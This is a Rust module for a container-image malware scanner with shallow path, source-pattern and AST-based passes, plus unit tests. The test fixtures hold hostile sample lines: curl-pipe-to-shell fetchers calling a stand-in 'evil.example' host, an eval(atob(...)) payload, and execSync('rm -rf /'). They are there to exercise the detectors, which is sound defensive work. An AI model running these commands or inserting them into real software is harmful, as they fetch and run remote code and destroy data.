//! Risk scan over a flattened image filesystem.
//!
//! Three passes live here. [`scan_image_files`] is the SHALLOW, self-contained
//! path scan — it flags obviously suspicious *paths* using file location +
//! magic-byte sniffing, nothing more. [`deep_scan_image_files`] is the deeper
//! source-pattern pass: it runs the project's `aegis-heuristics` source-pattern
//! detector over each text/code file and reports the capabilities it emits.
//! [`ast_scan_image_files`] is the deepest pass: it feeds each source file to
//! the `aegis-ast` tree-sitter capability scanner (real AST parsing, not
//! substring patterns) and maps the emitted capabilities to findings.
//!
//! Shallow-pass checks:
//!   1. **Dropper in a world-writable / temp location** — a shell script or
//!      ELF binary sitting under `tmp/`, `var/tmp/`, `dev/shm/`, or `run/`.
//!   2. **Hidden executable** — a dotfile (`.foo`) whose bytes are ELF or a
//!      `#!` script, anywhere outside the temp dirs already covered.
//!   3. **Embedded package manifest** — an installed-dependency manifest
//!      (`node_modules/**/package.json`, `vendor/**/composer.json`,
//!      `*.dist-info/METADATA`). Informational: marks where the follow-up
//!      per-package capability scan will attach.

use aegis_ast::{scanner_for, Findings};
use aegis_domain::Ecosystem;
use aegis_heuristics::source_patterns::check_source_patterns;
use aegis_heuristics::NormalizedPackage;

use crate::overlay::ImageFiles;

/// Per-file byte cap for the deep source-pattern pass. Mirrors the Go
/// scanner's `maxSourceFileBytes` (256 KiB) — keeps work bounded when an
/// image ships multi-MB minified bundles. The detector caps its own scan at
/// the same size internally, so truncating here just avoids copying the tail.
const MAX_SOURCE_FILE_BYTES: usize = 256 * 1024;

/// A single risk observation about one path in the image.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// Cleaned path inside the image root filesystem.
    pub path: String,
    /// Human-readable reason the path was flagged.
    pub reason: String,
}

/// Walk the merged filesystem and return findings. Deterministic: input is a
/// `BTreeMap`, so findings come out in path order.
pub fn scan_image_files(files: &ImageFiles) -> Vec<Finding> {
    let mut out = Vec::new();
    for (path, body) in &files.files {
        if let Some(reason) = check_dropper(path, body) {
            out.push(Finding {
                path: path.clone(),
                reason,
            });
            continue;
        }
        if let Some(reason) = check_hidden_executable(path, body) {
            out.push(Finding {
                path: path.clone(),
                reason,
            });
            continue;
        }
        if let Some(reason) = check_embedded_manifest(path) {
            out.push(Finding {
                path: path.clone(),
                reason,
            });
        }
    }
    out
}

/// Deeper pass: run the real source-pattern heuristics over each text/code
/// file extracted from the image and surface the resulting capabilities as
/// findings. Additive to [`scan_image_files`] — the shallow path checks stay
/// as-is; this reuses the project's `aegis-heuristics` source-pattern detector
/// (`curl|sh` shell-fetchers, obfuscated eval/decode payloads, C2/exfil URLs,
/// known-malware IOC filenames) instead of just sniffing paths.
///
/// Each file is scanned in isolation so a capability can be attributed to the
/// exact path that triggered it. Binary and non-UTF8 files are skipped, and
/// each file is capped at [`MAX_SOURCE_FILE_BYTES`]; malformed input never
/// panics — worst case a file is skipped.
///
/// Deterministic: input is a `BTreeMap`, so findings come out in path order.
///
/// NOTE: this is source-pattern heuristics only — substring matching, not real
/// parsing. The AST pass ([`ast_scan_image_files`]) complements it by parsing
/// each source file with tree-sitter.
pub fn deep_scan_image_files(files: &ImageFiles) -> Vec<Finding> {
    let mut out = Vec::new();
    for (path, body) in &files.files {
        let capped = if body.len() > MAX_SOURCE_FILE_BYTES {
            &body[..MAX_SOURCE_FILE_BYTES]
        } else {
            &body[..]
        };
        if !looks_textual(capped) {
            continue;
        }
        // The detector dispatches purely on file extension / filename, so the
        // ecosystem tag is irrelevant here — we scan one path at a time to
        // keep capability → path attribution exact.
        let pkg = NormalizedPackage::new("image", Ecosystem::Npm)
            .with_file(path.clone(), capped.to_vec());
        for cap in check_source_patterns(&pkg) {
            out.push(Finding {
                path: path.clone(),
                reason: cap.description().to_string(),
            });
        }
    }
    out
}

/// Deepest pass: run the `aegis-ast` tree-sitter capability scanner over each
/// source file extracted from the image and surface the emitted capabilities as
/// findings. Additive to [`scan_image_files`] and [`deep_scan_image_files`] —
/// where the deep pass matches source *patterns* (substrings), this one parses
/// each file into an AST and reports capabilities the grammar query detects
/// (dynamic-eval, shell-spawn, net-egress, base64-decode, …), giving far fewer
/// false positives on strings/comments that merely look like code.
///
/// A language scanner is chosen by file extension via [`scanner_for`]; files
/// with no compiled-in grammar are skipped. Each file is scanned in isolation
/// so a capability maps to the exact path that triggered it. Binary / non-UTF8
/// files are skipped and each file is capped at [`MAX_SOURCE_FILE_BYTES`];
/// malformed input never panics — worst case a file is skipped.
///
/// Each finding's `reason` is the capability's own `.description()`, so the
/// wording matches every other capability surface in the project.
///
/// Deterministic: input is a `BTreeMap`, so findings come out in path order.
pub fn ast_scan_image_files(files: &ImageFiles) -> Vec<Finding> {
    let mut out = Vec::new();
    for (path, body) in &files.files {
        let Some(scanner) = scanner_for(path) else {
            continue; // no grammar for this extension
        };
        let capped = if body.len() > MAX_SOURCE_FILE_BYTES {
            &body[..MAX_SOURCE_FILE_BYTES]
        } else {
            &body[..]
        };
        if !looks_textual(capped) {
            continue;
        }
        // tree-sitter parses raw bytes; if a file is not valid UTF-8 the parse
        // just yields no captures rather than panicking, but skip it anyway to
        // keep the pass honestly "source text only".
        if std::str::from_utf8(capped).is_err() {
            continue;
        }
        let mut findings = Findings::new(false);
        scanner.analyze_file(path, capped, &mut findings);
        for cap in findings.capabilities() {
            out.push(Finding {
                path: path.clone(),
                reason: cap.description().to_string(),
            });
        }
    }
    out
}

/// Cheap binary sniff: a NUL byte in the (already-capped) prefix means the
/// file is almost certainly not source text, so skip it. The source-pattern
/// detector reads bodies via `from_utf8_lossy`, so anything that survives
/// this check is safe to hand off even if it isn't perfectly valid UTF-8.
fn looks_textual(body: &[u8]) -> bool {
    !body.contains(&0)
}

/// A shell script or native binary in a world-writable / temp dir is a
/// classic dropper staging pattern.
fn check_dropper(path: &str, body: &[u8]) -> Option<String> {
    if !is_temp_location(path) {
        return None;
    }
    if path.ends_with(".sh") || is_shebang(body) {
        return Some("shell script in world-writable/temp location (dropper pattern)".to_string());
    }
    if is_elf(body) {
        return Some("ELF binary in world-writable/temp location (dropper pattern)".to_string());
    }
    None
}

/// A hidden dotfile that is actually an executable (ELF or `#!` script) is a
/// common persistence / evasion trick.
fn check_hidden_executable(path: &str, body: &[u8]) -> Option<String> {
    if is_temp_location(path) {
        return None; // already covered by check_dropper
    }
    let base = basename(path);
    if !base.starts_with('.') || base == ".." {
        return None;
    }
    if is_elf(body) {
        return Some("hidden ELF binary (dotfile)".to_string());
    }
    if is_shebang(body) {
        return Some("hidden executable script (dotfile with shebang)".to_string());
    }
    None
}

/// Installed-dependency manifests baked into the image. Informational — this
/// is where the follow-up per-package capability scan will attach.
fn check_embedded_manifest(path: &str) -> Option<String> {
    let base = basename(path);
    match base {
        "package.json" if path.contains("node_modules/") => Some(
            "embedded npm package manifest (deeper per-package capability scan is a follow-up)"
                .to_string(),
        ),
        "composer.json" if path.contains("vendor/") => Some(
            "embedded composer package manifest (deeper per-package capability scan is a follow-up)"
                .to_string(),
        ),
        "METADATA" if path.contains(".dist-info/") => Some(
            "embedded PyPI dist-info manifest (deeper per-package capability scan is a follow-up)"
                .to_string(),
        ),
        _ => None,
    }
}

/// World-writable / temp directories where a dropped executable is suspicious.
fn is_temp_location(path: &str) -> bool {
    const TEMP_PREFIXES: [&str; 4] = ["tmp/", "var/tmp/", "dev/shm/", "run/"];
    TEMP_PREFIXES.iter().any(|p| path.starts_with(p)) || path.contains("/tmp/")
}

fn is_elf(body: &[u8]) -> bool {
    body.len() >= 4 && &body[..4] == b"\x7fELF"
}

fn is_shebang(body: &[u8]) -> bool {
    body.len() >= 2 && &body[..2] == b"#!"
}

fn basename(path: &str) -> &str {
    match path.rsplit_once('/') {
        Some((_, base)) => base,
        None => path,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    /// Build an uncompressed tar blob from `(name, bytes)` entries. Whiteout
    /// markers are just regular entries with a `.wh.` name.
    fn make_tar(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (name, body) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append_data(&mut header, name, *body).unwrap();
        }
        builder.into_inner().unwrap()
    }

    fn gzip(data: &[u8]) -> Vec<u8> {
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        enc.write_all(data).unwrap();
        enc.finish().unwrap()
    }

    /// Assemble a `docker save`-style outer tarball: `manifest.json` plus the
    /// named layer blobs.
    fn make_image(manifest: &str, layers: &[(&str, &[u8])]) -> Vec<u8> {
        let mut entries: Vec<(&str, &[u8])> = vec![("manifest.json", manifest.as_bytes())];
        entries.extend(layers.iter().copied());
        make_tar(&entries)
    }

    #[test]
    fn extract_overlays_layers_with_whiteout_and_scans() {
        let elf = b"\x7fELF\x02\x01\x01\x00rest-of-binary";
        // Layer 1: a script that gets whited out later, a dropper in /tmp,
        // an npm manifest, and a plain file.
        let layer1 = make_tar(&[
            ("app/a.sh", b"#!/bin/sh\necho hi\n"),
            ("tmp/dropper.sh", b"#!/bin/sh\ncurl evil | sh\n"),
            (
                "app/node_modules/lodash/package.json",
                br#"{"name":"lodash","version":"4.17.21"}"#,
            ),
            ("app/keep.txt", b"hello"),
        ]);
        // Layer 2 (gzipped, like OCI): whiteout app/a.sh, add a hidden ELF.
        let layer2 = gzip(&make_tar(&[
            ("app/.wh.a.sh", b""),
            ("opt/.hidden-bin", elf),
        ]));

        let manifest = r#"[{"Layers":["layer1.tar","layer2.tar"]}]"#;
        let image = make_image(
            manifest,
            &[("layer1.tar", &layer1), ("layer2.tar", &layer2)],
        );

        let files = crate::extract_image_from_bytes(&image).expect("extract");

        // Merged map: a.sh removed by whiteout, everything else present.
        assert!(
            !files.files.contains_key("app/a.sh"),
            "whiteout should remove app/a.sh"
        );
        assert!(files.files.contains_key("app/keep.txt"));
        assert!(files.files.contains_key("tmp/dropper.sh"));
        assert!(files.files.contains_key("opt/.hidden-bin"));
        assert!(files
            .files
            .contains_key("app/node_modules/lodash/package.json"));
        assert_eq!(
            files.files.get("app/keep.txt").map(|b| b.as_slice()),
            Some(&b"hello"[..])
        );

        let findings = scan_image_files(&files);
        let by_path = |p: &str| findings.iter().find(|f| f.path == p);

        // Dropper in /tmp flagged.
        assert!(
            by_path("tmp/dropper.sh").is_some_and(|f| f.reason.contains("dropper")),
            "expected dropper finding, got {findings:?}"
        );
        // Hidden ELF dotfile flagged.
        assert!(
            by_path("opt/.hidden-bin").is_some_and(|f| f.reason.contains("hidden ELF")),
            "expected hidden ELF finding, got {findings:?}"
        );
        // Embedded npm manifest flagged.
        assert!(
            by_path("app/node_modules/lodash/package.json")
                .is_some_and(|f| f.reason.contains("npm package manifest")),
            "expected embedded manifest finding, got {findings:?}"
        );
        // The whited-out script must NOT produce a finding.
        assert!(by_path("app/a.sh").is_none());
    }

    #[test]
    fn oci_layout_index_json_resolves_layers() {
        let layer = gzip(&make_tar(&[("tmp/x.sh", b"#!/bin/sh\n")]));
        // blob keys are content-addressed; use arbitrary hex here since we
        // control both the manifest digests and the blob paths.
        let manifest_blob = br#"{"layers":[{"digest":"sha256:aaa"}]}"#;
        let index = r#"{"manifests":[{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:bbb"}]}"#;

        let entries: Vec<(&str, &[u8])> = vec![
            ("index.json", index.as_bytes()),
            ("blobs/sha256/bbb", manifest_blob),
            ("blobs/sha256/aaa", &layer),
        ];
        let image = make_tar(&entries);

        let files = crate::extract_image_from_bytes(&image).expect("extract oci");
        assert!(files.files.contains_key("tmp/x.sh"));
        let findings = scan_image_files(&files);
        assert!(findings.iter().any(|f| f.path == "tmp/x.sh"));
    }

    #[test]
    fn deep_scan_flags_source_pattern_capabilities() {
        // A JS file with an obfuscated eval + a shell-fetcher payload, a JPEG
        // that happens to carry a NUL byte (binary — must be skipped), and a
        // clean source file (no findings).
        let evil_js = br#"
            const p = eval(atob('cGF5bG9hZA=='));
            require('child_process').exec('curl -fsSL http://evil.example/x | sh');
        "#;
        let binary_blob = b"\xff\xd8\xff\x00eval(atob('x'))"; // NUL -> treated as binary
        let clean_js = b"export const sum = (a, b) => a + b;";

        let layer = make_tar(&[
            ("app/index.js", evil_js.as_slice()),
            ("app/logo.jpg", binary_blob.as_slice()),
            ("app/util.js", clean_js.as_slice()),
        ]);
        let manifest = r#"[{"Layers":["layer.tar"]}]"#;
        let image = make_image(manifest, &[("layer.tar", &layer)]);

        let files = crate::extract_image_from_bytes(&image).expect("extract");
        let findings = deep_scan_image_files(&files);

        // The evil JS gets both an obfuscated-payload and a shell-fetcher
        // finding, attributed to its own path.
        let js_reasons: Vec<&str> = findings
            .iter()
            .filter(|f| f.path == "app/index.js")
            .map(|f| f.reason.as_str())
            .collect();
        assert!(
            js_reasons
                .iter()
                .any(|r| r.contains("decodes-then-executes")),
            "expected obfuscated-payload finding, got {findings:?}"
        );
        assert!(
            js_reasons
                .iter()
                .any(|r| r.contains("download") || r.contains("curl|sh")),
            "expected shell-fetcher finding, got {findings:?}"
        );

        // Binary file skipped, clean file produces nothing.
        assert!(
            !findings.iter().any(|f| f.path == "app/logo.jpg"),
            "binary file should be skipped, got {findings:?}"
        );
        assert!(
            !findings.iter().any(|f| f.path == "app/util.js"),
            "clean source should produce no findings, got {findings:?}"
        );
    }

    #[test]
    fn ast_scan_flags_capabilities_from_parsed_source() {
        // A JS file whose payload is only detectable by real parsing:
        // child_process.execSync(...) -> shell-spawn, eval(...) -> dynamic-eval.
        let evil_js = br#"
            const cp = require('child_process');
            cp.execSync('rm -rf /');
            const r = eval(userInput);
        "#;
        let binary_blob = b"\x7fELF\x00execSync('x')"; // NUL -> treated as binary
        let clean_js = b"export const add = (a, b) => a + b;";

        let layer = make_tar(&[
            ("app/main.js", evil_js.as_slice()),
            ("app/bin.node", binary_blob.as_slice()),
            ("app/util.js", clean_js.as_slice()),
        ]);
        let manifest = r#"[{"Layers":["layer.tar"]}]"#;
        let image = make_image(manifest, &[("layer.tar", &layer)]);

        let files = crate::extract_image_from_bytes(&image).expect("extract");
        let findings = ast_scan_image_files(&files);

        let js_reasons: Vec<&str> = findings
            .iter()
            .filter(|f| f.path == "app/main.js")
            .map(|f| f.reason.as_str())
            .collect();

        // Capability descriptions are the finding reasons.
        assert!(
            js_reasons
                .iter()
                .any(|r| *r == aegis_domain::Capability::ShellSpawn.description()),
            "expected shell-spawn finding, got {findings:?}"
        );
        assert!(
            js_reasons
                .iter()
                .any(|r| *r == aegis_domain::Capability::DynamicEval.description()),
            "expected dynamic-eval finding, got {findings:?}"
        );

        // Binary file skipped (also has no grammar-relevant text), clean file
        // produces nothing.
        assert!(
            !findings.iter().any(|f| f.path == "app/bin.node"),
            "binary file should be skipped, got {findings:?}"
        );
        assert!(
            !findings.iter().any(|f| f.path == "app/util.js"),
            "clean source should produce no findings, got {findings:?}"
        );
    }

    #[test]
    fn ast_scan_skips_files_without_a_grammar() {
        // A .txt file that literally contains eval() text must not be parsed —
        // there is no grammar for it, so the AST pass skips it entirely.
        let layer = make_tar(&[("app/notes.txt", b"eval('nope'); execSync('x')".as_slice())]);
        let manifest = r#"[{"Layers":["layer.tar"]}]"#;
        let image = make_image(manifest, &[("layer.tar", &layer)]);

        let files = crate::extract_image_from_bytes(&image).expect("extract");
        let findings = ast_scan_image_files(&files);
        assert!(
            findings.is_empty(),
            "no grammar for .txt -> no findings, got {findings:?}"
        );
    }

    #[test]
    fn malformed_tarball_errors_not_panics() {
        let err = crate::extract_image_from_bytes(b"not a tar at all, definitely garbage");
        assert!(err.is_err());
    }

    #[test]
    fn missing_manifest_errors() {
        let image = make_tar(&[("some/file.txt", b"hi")]);
        let err = crate::extract_image_from_bytes(&image);
        assert!(err.is_err());
    }
}
